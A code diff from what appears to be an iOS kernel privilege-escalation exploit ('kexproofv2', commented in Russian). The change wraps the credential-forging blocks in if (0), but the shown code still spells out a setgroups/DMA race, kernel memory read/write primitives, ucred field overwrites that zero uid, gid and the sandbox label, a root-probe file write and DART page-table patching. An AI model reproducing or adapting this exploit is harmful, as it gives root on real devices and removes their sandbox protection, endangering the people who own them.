@@ -8039,6 +8039,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 uint32_t uoff = (uint32_t)(ucF & 0x3fff);
                 uint64_t pagePA = kvtophys(pageVA);
                 int errF = errno;
+if (0) {  // 2.0.35: записи в cred-пространство вырезаны (zfree-паники)
                 // kexproofv2 2.0.26 [UUNLOCK-RACE v3] — v2 серийная (setgroups →
                 // DMA) не пересекалась с окном: оно открыто только внутри
                 // syscall'а. v3: ПАРАЛЛЕЛЬНО — спиннер setgroups держит окно
@@ -8068,6 +8069,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                         kpNote(r, @"=== ROOT ДОСТИГНУТ: getuid()==0 — UUNLOCK-RACE v3 (параллельная гонка) ===");
                         FILE *fp = fopen("/private/var/mobile/kexproof-root-probe.txt", "w");
                         if (fp) { fputs("root via UUNLOCK-RACE v3\n", fp); fclose(fp); }
+                }
                     }
                 }
                 // kexproofv2 2.0.27 [SELPROBE] — confused-deputy hunt. ВЫКЛ (2.0.28):
@@ -9007,7 +9009,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 // +0x20 (RMW — S-поля +0x24 не трогаем), groups[0] +0x28
                 // (RMW — groups[1] не трогаем), rgid|svgid +0x68 (8B=0),
                 // cr_label +0x78 (8B=0 → sandbox off).
-                BOOL inplRoot = NO;
+BOOL inplRoot = NO;   // 2.0.35: записи вырезаны
+                if (0) {  // 2.0.35: записи в cred-пространство вырезаны (zfree-паники)
                 if (paOK && svc && ttM && isTable && pagePA && uoff + 0x80 <= 0x4000 && !gT18Root) {
                     uint64_t pgPA = pagePA & ~0x3fffULL;
                     uint64_t q20 = early_kread64(ucF + 0x20);
@@ -9039,6 +9042,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 // kexproofv2 2.0.0: тяжёлый форж — только если INPL не взял.
                 // 1.9.251: форжим ВСЮ 16KB-страницу — ucred сидит на uoff=0x38b0,
                 // 4KB записи не доставало (rect 64×64 = 0x4000 в tsdF ниже).
+if (0) {  // 2.0.35: записи в cred-пространство вырезаны (zfree-паники)
                 if (!inplRoot && !gT18Root && paOK && uoff + 0xc0 <= 0x4000) {
                     uint8_t fbuf[0x4000];
                     for (uint32_t i = 0; i < 0x4000; i += 8) *(uint64_t *)(fbuf + i) = early_kread64(pageVA + i);
@@ -9100,6 +9104,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                         fkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdF, sizeof(tsdF), NULL, NULL, NULL, NULL);
                         usleep(400000);
                     }
+                }
                     uid_t gu = getuid(); gid_t gg = getgid();
                     uint32_t cru = (uint32_t)early_kread64(ucF + 0x18);
                     uint64_t lbl = early_kread64(ucF + 0x78);
@@ -9120,6 +9125,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     } else {
         kpNote(r, @"=== контрольная не изменилась — см. выше ===");
     }
+                }
     // 1.9.219: restore DEP-хитов после форжа (яд формы ucredPFN не живёт дальше)
     if (changed) for (int i = 0; i < nDep; i++) if (hitForm[i] > 0 && hitForm[i] != 4) early_kwrite64(hitAddr[i], hitOld[i]);
     // === 1.9.160 фаза 2: DART PTE patch с живым mapping (раунд 36) ===
